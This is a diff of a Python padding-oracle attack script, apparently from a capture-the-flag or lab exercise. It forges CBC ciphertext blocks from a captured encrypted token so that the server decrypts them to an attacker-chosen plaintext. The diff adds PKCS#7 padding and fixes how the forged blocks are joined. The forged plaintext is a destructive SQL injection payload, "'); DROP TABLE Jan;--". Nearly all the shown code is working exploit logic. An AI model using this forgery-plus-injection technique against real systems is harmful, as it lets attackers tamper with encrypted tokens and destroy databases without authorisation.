@@ -1,14 +1,24 @@
-from multiprocessing import Pool
 from urllib import parse
 import requests
 import time
 import base64
 
 NEW_PLAIN = "'); DROP TABLE Jan;-- not the data you need....."
+NEW_PLAIN = "'); DROP TABLE Jan;-- not the data you need"
 
 #TODO: parallel
 def main():
     start = time.time()
+
+    char_count = len(NEW_PLAIN)
+    padd_need = 16 - (char_count % 16)
+
+    padding = []
+
+    for i in range(0,padd_need):
+        padding.append(padd_need)
+
+    padding = bytearray(padding)
 
     # this is the original secret
     secret = "2QicDQHnGmRuZys0M5JcwCSTeFNXvVm%2FSsG1vaEkIZU1OiGgpLJTdbRO2beA831a0xsatfOy01N38W1RidzrXA%3D%3D"
@@ -22,7 +32,8 @@ def main():
     # turns bytes into 16 byte sized chunks
     blocks = get_blocks(chiffre_bytes)
 
-    new_text = bytes(NEW_PLAIN, encoding="ascii")
+    new_text = bytearray(NEW_PLAIN, encoding="ascii")
+    new_text = new_text + padding
     new_text_blocks = get_blocks(new_text)
     
     new_chiffre_blocks = [None] * len(blocks)
@@ -36,7 +47,7 @@ def main():
     new_chiffre_blocks[0] = transform(crack(new_chiffre_blocks[1], blocks[0])["IB"], new_text_blocks[0])
     
     result = bytearray()
-    for i in range(0, len(new_chiffre_blocks)-1):
+    for i in range(0, len(new_chiffre_blocks)):
        result.extend(new_chiffre_blocks[i])
     
     #bytearray
